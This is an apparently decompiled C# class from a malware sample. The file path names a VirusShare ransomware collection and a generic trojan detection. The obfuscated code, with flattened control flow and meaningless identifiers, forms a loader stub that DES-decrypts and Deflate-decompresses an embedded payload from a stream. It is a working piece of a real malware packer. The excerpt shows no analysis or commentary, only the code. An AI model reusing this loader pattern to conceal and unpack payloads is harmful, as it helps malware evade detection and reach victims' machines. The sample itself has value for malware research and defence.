// Decompiled with JetBrains decompiler
// Type: A.cc74a8ab39ab58be79fe769554139265a
// Assembly: WindowsApplication2Loader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F7227F94-C268-4B4C-B7D7-E3B6EE9F4271
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-0a49fbe363dae0e535e59b4659144d2f38783dadf7ba78ab924ca88ccb1975b4.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace A
{
  internal sealed class cc74a8ab39ab58be79fe769554139265a
  {
    private static MemoryStream c6cafcc6ea51fa8ac4cf32adf1f511a0a;
    private static MemoryStream cf7b886209868fec4ac70ca5cd4745600;
    private static object c90438da8e8c523f65e2a9970751aa9ab;
    private static int cd05e6dd2a33391be09584aa8ed398e6f = int.MaxValue;
    private static int cb624d2e84db5d59c985d297614fdb79c = int.MinValue;

    static cc74a8ab39ab58be79fe769554139265a()
    {
      cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a = (MemoryStream) null;
      cc74a8ab39ab58be79fe769554139265a.cf7b886209868fec4ac70ca5cd4745600 = (MemoryStream) null;
      cc74a8ab39ab58be79fe769554139265a.c90438da8e8c523f65e2a9970751aa9ab = ce31a4fb881361489d1a488312505ff74.ca68ee7d21075db206eea02989df78421();
    }

    private static string cc898e53faa0ad36aa901966ce399bac7(Assembly _param0)
    {
      string str = c91d5c1f42f9fe4076056fbc866d24d69.c6bccb7429e4662d04bc45982e6b18741((object) _param0);
      int num = c2f820099ceabe5410040c9f37528b4c3.c6bccb7429e4662d04bc45982e6b18741((object) str, ',');
      if (num >= 0)
      {
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (cc74a8ab39ab58be79fe769554139265a.cc898e53faa0ad36aa901966ce399bac7);
            }
            str = cb806b4d4ba64ebc383cc6cc720f1fd24.c6bccb7429e4662d04bc45982e6b18741((object) str, 0, num);
            break;
        }
      }
      return str;
    }

    private static byte[] c542211ca5f10f8f05ff5813e7b1e0687(Assembly _param0)
    {
      try
      {
        string str = c91d5c1f42f9fe4076056fbc866d24d69.c6bccb7429e4662d04bc45982e6b18741((object) _param0);
        int num1 = c68402cb24413fb50ef8ccc69b85c8833.c6bccb7429e4662d04bc45982e6b18741((object) str, "PublicKeyToken=");
        if (num1 < 0)
        {
label_1:
          switch (4)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (cc74a8ab39ab58be79fe769554139265a.c542211ca5f10f8f05ff5813e7b1e0687);
              }
              num1 = c68402cb24413fb50ef8ccc69b85c8833.c6bccb7429e4662d04bc45982e6b18741((object) str, "publickeytoken=");
              break;
          }
        }
        if (num1 < 0)
        {
label_6:
          switch (6)
          {
            case 0:
              goto label_6;
            default:
              return (byte[]) null;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (cea258912cbc5a9285ee129c4d3e03dbc.c6bccb7429e4662d04bc45982e6b18741((object) str, num2) != 'n')
          {
label_9:
            switch (1)
            {
              case 0:
                goto label_9;
              default:
                if (cea258912cbc5a9285ee129c4d3e03dbc.c6bccb7429e4662d04bc45982e6b18741((object) str, num2) == 'N')
                {
label_11:
                  switch (5)
                  {
                    case 0:
                      goto label_11;
                  }
                }
                else
                {
                  byte[] numArray = c0f3d78cbbf1b89f33b0a11bef6ea0a9c.ca68ee7d21075db206eea02989df78421(c04e5ce2a062eff5d52827557caefdbe2.ca68ee7d21075db206eea02989df78421(cb806b4d4ba64ebc383cc6cc720f1fd24.c6bccb7429e4662d04bc45982e6b18741((object) str, num2, 16), NumberStyles.HexNumber));
                  c38cbeb338adb296a8bd684d610e4ffce.ca68ee7d21075db206eea02989df78421((Array) numArray);
                  return numArray;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] cf72f374eb89509548502d2bcbc68790a(Stream _param0)
    {
      object c90438da8e8c523f65e2a9970751aa9ab;
      c7e9327a3d07849dec48f0bc4cb479e9a.ca68ee7d21075db206eea02989df78421(c90438da8e8c523f65e2a9970751aa9ab = cc74a8ab39ab58be79fe769554139265a.c90438da8e8c523f65e2a9970751aa9ab);
      try
      {
        Stream stream = _param0;
        MemoryStream memoryStream = (MemoryStream) null;
        byte num1 = (byte) cc7e46cf401221765fcdcad91f04276a6.c6bccb7429e4662d04bc45982e6b18741((object) _param0);
        if (((int) num1 & 2) != 0)
        {
label_2:
          switch (7)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (cc74a8ab39ab58be79fe769554139265a.cf72f374eb89509548502d2bcbc68790a);
              }
              DESCryptoServiceProvider cryptoServiceProvider = c6d89ae36f6a1dc24c201565b29499ade.ca68ee7d21075db206eea02989df78421();
              byte[] numArray1 = new byte[8];
              c61c109d393b61b647259b3ebace755b9.c6bccb7429e4662d04bc45982e6b18741((object) _param0, numArray1, 0, 8);
              c20dd34b193926b02b44618e082f5e95c.c6bccb7429e4662d04bc45982e6b18741((object) cryptoServiceProvider, numArray1);
              byte[] numArray2 = new byte[8];
              c61c109d393b61b647259b3ebace755b9.c6bccb7429e4662d04bc45982e6b18741((object) _param0, numArray2, 0, 8);
              bool flag = true;
              foreach (byte num2 in numArray2)
              {
                if (num2 != (byte) 0)
                {
label_7:
                  switch (7)
                  {
                    case 0:
                      goto label_7;
                    default:
                      flag = false;
                      goto label_12;
                  }
                }
              }
label_11:
              switch (5)
              {
                case 0:
                  goto label_11;
              }
label_12:
              if (flag)
              {
label_13:
                switch (6)
                {
                  case 0:
                    goto label_13;
                  default:
                    numArray2 = cc74a8ab39ab58be79fe769554139265a.c542211ca5f10f8f05ff5813e7b1e0687(cff9d26e8934b651d5cf7b8bdf7fb78ff.ca68ee7d21075db206eea02989df78421());
                    break;
                }
              }
              c4964da920cdc272a0a92fc1bbc69653a.c6bccb7429e4662d04bc45982e6b18741((object) cryptoServiceProvider, numArray2);
              if (cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a == null)
              {
label_16:
                switch (2)
                {
                  case 0:
                    goto label_16;
                  default:
                    if (cc74a8ab39ab58be79fe769554139265a.cd05e6dd2a33391be09584aa8ed398e6f == int.MaxValue)
                    {
label_18:
                      switch (6)
                      {
                        case 0:
                          goto label_18;
                        default:
                          cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a = c8738c4bbe2da0d63f8b26b7dc0777ae7.ca68ee7d21075db206eea02989df78421((int) c1f4ebf71b8af797c74673418a2f384d8.c6bccb7429e4662d04bc45982e6b18741((object) _param0));
                          break;
                      }
                    }
                    else
                    {
                      cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a = c8738c4bbe2da0d63f8b26b7dc0777ae7.ca68ee7d21075db206eea02989df78421(cc74a8ab39ab58be79fe769554139265a.cd05e6dd2a33391be09584aa8ed398e6f);
                      break;
                    }
                    break;
                }
              }
              c2581fb482878b3a2ac9d4ac274db0925.c6bccb7429e4662d04bc45982e6b18741((object) cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a, 0L);
              ICryptoTransform cryptoTransform = c2f020a80f5b6ccdda1995a463f0a8c56.c6bccb7429e4662d04bc45982e6b18741((object) cryptoServiceProvider);
              int num3 = c27aae3d80a218ff0d1c87a67f79a604d.c6bccb7429e4662d04bc45982e6b18741((object) cryptoTransform);
              cfa975504cee78a5b631749ea2f0ff688.c6bccb7429e4662d04bc45982e6b18741((object) cryptoTransform);
              byte[] numArray3 = new byte[cfa975504cee78a5b631749ea2f0ff688.c6bccb7429e4662d04bc45982e6b18741((object) cryptoTransform)];
              byte[] numArray4 = new byte[c27aae3d80a218ff0d1c87a67f79a604d.c6bccb7429e4662d04bc45982e6b18741((object) cryptoTransform)];
              int num4;
              for (num4 = (int) c34f4d7477295f09c4bc59e2a31b77de7.c6bccb7429e4662d04bc45982e6b18741((object) _param0); (long) (num4 + num3) < c1f4ebf71b8af797c74673418a2f384d8.c6bccb7429e4662d04bc45982e6b18741((object) _param0); num4 += num3)
              {
                c61c109d393b61b647259b3ebace755b9.c6bccb7429e4662d04bc45982e6b18741((object) _param0, numArray4, 0, num3);
                int num5 = cea4d7429bd622d84d2b99a17903c9219.c6bccb7429e4662d04bc45982e6b18741((object) cryptoTransform, numArray4, 0, num3, numArray3, 0);
                cd7d82fbda59985e09f4923ba373e1231.c6bccb7429e4662d04bc45982e6b18741((object) cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a, numArray3, 0, num5);
              }
label_24:
              switch (2)
              {
                case 0:
                  goto label_24;
                default:
                  c61c109d393b61b647259b3ebace755b9.c6bccb7429e4662d04bc45982e6b18741((object) _param0, numArray4, 0, (int) (c1f4ebf71b8af797c74673418a2f384d8.c6bccb7429e4662d04bc45982e6b18741((object) _param0) - (long) num4));
                  byte[] numArray5 = c97f4991b35d67f4e3d508f7c3feda79b.c6bccb7429e4662d04bc45982e6b18741((object) cryptoTransform, numArray4, 0, (int) (c1f4ebf71b8af797c74673418a2f384d8.c6bccb7429e4662d04bc45982e6b18741((object) _param0) - (long) num4));
                  cd7d82fbda59985e09f4923ba373e1231.c6bccb7429e4662d04bc45982e6b18741((object) cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a, numArray5, 0, numArray5.Length);
                  stream = (Stream) cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a;
                  c2581fb482878b3a2ac9d4ac274db0925.c6bccb7429e4662d04bc45982e6b18741((object) stream, 0L);
                  memoryStream = cc74a8ab39ab58be79fe769554139265a.c6cafcc6ea51fa8ac4cf32adf1f511a0a;
                  break;
              }
              break;
          }
        }
        if (((int) num1 & 8) != 0)
        {
label_27:
          switch (2)
          {
            case 0:
              goto label_27;
            default:
              try
              {
                if (cc74a8ab39ab58be79fe769554139265a.cf7b886209868fec4ac70ca5cd4745600 == null)
                {
label_29:
                  switch (5)
                  {
                    case 0:
                      goto label_29;
                    default:
                      if (cc74a8ab39ab58be79fe769554139265a.cb624d2e84db5d59c985d297614fdb79c == int.MinValue)
                      {
label_31:
                        switch (7)
                        {
                          case 0:
                            goto label_31;
                          default:
                            cc74a8ab39ab58be79fe769554139265a.cf7b886209868fec4ac70ca5cd4745600 = c8738c4bbe2da0d63f8b26b7dc0777ae7.ca68ee7d21075db206eea02989df78421((int) c1f4ebf71b8af797c74673418a2f384d8.c6bccb7429e4662d04bc45982e6b18741((object) stream) * 2);
                            break;
                        }
                      }
                      else
                      {
                        cc74a8ab39ab58be79fe769554139265a.cf7b886209868fec4ac70ca5cd4745600 = c8738c4bbe2da0d63f8b26b7dc0777ae7.ca68ee7d21075db206eea02989df78421(cc74a8ab39ab58be79fe769554139265a.cb624d2e84db5d59c985d297614fdb79c);
                        break;
                      }
                      break;
                  }
                }
                c2581fb482878b3a2ac9d4ac274db0925.c6bccb7429e4662d04bc45982e6b18741((object) cc74a8ab39ab58be79fe769554139265a.cf7b886209868fec4ac70ca5cd4745600, 0L);
                DeflateStream deflateStream = cee5e24c461c66972d7eec81a6c57842b.ca68ee7d21075db206eea02989df78421(stream, CompressionMode.Decompress);
                int length = 1000;
                byte[] numArray = new byte[length];
                int num6;
                do
                {
                  num6 = c61c109d393b61b647259b3ebace755b9.c6bccb7429e4662d04bc45982e6b18741((object) deflateStream, numArray, 0, length);
                  if (num6 > 0)
                  {
label_36:
                    switch (7)
                    {
                      case 0:
                        goto label_36;
                      default:
                        cd7d82fbda59985e09f4923ba373e1231.c6bccb7429e4662d04bc45982e6b18741((object) cc74a8ab39ab58be79fe769554139265a.cf7b886209868fec4ac70ca5cd4745600, numArray, 0, num6);
                        break;
                    }
                  }
                }
                while (num6 >= length);
label_39:
                switch (7)
                {
                  case 0:
                    goto label_39;
                  default:
                    memoryStream = cc74a8ab39ab58be79fe769554139265a.cf7b886209868fec4ac70ca5cd4745600;
                    break;
                }
              }
              catch (Exception ex)
              {
                break;
              }
              break;
          }
        }
        if (memoryStream != null)
        {
label_43:
          switch (7)
          {
            case 0:
              goto label_43;
            default:
              return cc3f9a85a011c09329c52cf24151d3926.c6bccb7429e4662d04bc45982e6b18741((object) memoryStream);
          }
        }
        else
        {
          byte[] numArray = new byte[c1f4ebf71b8af797c74673418a2f384d8.c6bccb7429e4662d04bc45982e6b18741((object) _param0) - c34f4d7477295f09c4bc59e2a31b77de7.c6bccb7429e4662d04bc45982e6b18741((object) _param0)];
          c61c109d393b61b647259b3ebace755b9.c6bccb7429e4662d04bc45982e6b18741((object) _param0, numArray, 0, numArray.Length);
          return numArray;
        }
      }
      finally
      {
        c1458b642306991157e8f914de19139c9.ca68ee7d21075db206eea02989df78421(c90438da8e8c523f65e2a9970751aa9ab);
      }
    }
  }
}
